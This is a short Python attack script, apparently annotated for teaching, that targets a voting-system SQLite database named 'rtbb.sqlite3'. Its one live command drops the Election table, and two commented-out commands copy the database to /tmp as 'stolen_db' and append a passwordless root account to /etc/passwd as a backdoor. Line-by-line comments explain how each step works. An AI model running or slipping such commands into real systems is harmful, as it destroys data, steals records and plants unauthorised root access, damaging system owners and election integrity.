#!/usr/bin/env python3
import os  # Operating System interface module

# Command 1: Copy database to /tmp
# os.system("cp rtbb.sqlite3 /tmp/stolen_db")
# - cp copies the file
# - /tmp is typically world-writable
# - Attacker can later retrieve stolen_db

# Command 2: Corrupt original database
os.system("echo 'DROP TABLE Election;' | sqlite3 rtbb.sqlite3")
# - echo sends SQL command to sqlite3
# - DROP TABLE deletes the Election table
# - | (pipe) connects the output of echo to sqlite3 input

# Command 3: Create backdoor user
# os.system("echo 'root::0:0:root:/root:/bin/bash' >> /etc/passwd")
# - Tries to add root user with no password
# - >> appends to /etc/passwd (if permissions allow)
# - Format: username:password:uid:gid:info:home:shell

# Why os.system?
# - Executes shell commands from Python
# - Has full system privileges of the running program
# - Can execute any shell command